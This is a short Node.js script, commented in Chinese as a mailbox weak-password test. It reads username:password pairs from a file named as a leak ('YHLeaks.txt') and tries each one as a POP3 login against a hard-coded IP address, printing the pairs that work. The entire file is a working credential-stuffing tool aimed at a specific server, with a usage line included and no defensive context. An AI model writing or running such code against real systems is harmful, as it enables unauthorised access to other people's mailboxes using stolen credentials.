// 信箱若口令测试
// node testPop3.js 125.71.203.220 110 /Users/xiatian/Desktop/mytels.txt
var pp = require('./pop3'),fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.prototype._maxListeners = 0;
require('events').EventEmitter.defaultMaxListeners = 0

var a = fs.readFileSync("./data/YHLeaks.txt").toString().split("\n");
var host = "125.71.203.220", port = 110;

for(var i = 0; i < a.length; i++)
{
	+function(s)
	{
		var x = s.split(":");
		if(2 == x.length && x[0] && x[1])
		{
			var oT,oR = new pp(oT={"port":port,"host":host,"username": x[0], "password": x[1]},function()
			{
				console.log([oT.username,oT.password]);
			});
		}
	}(a[i]);
}
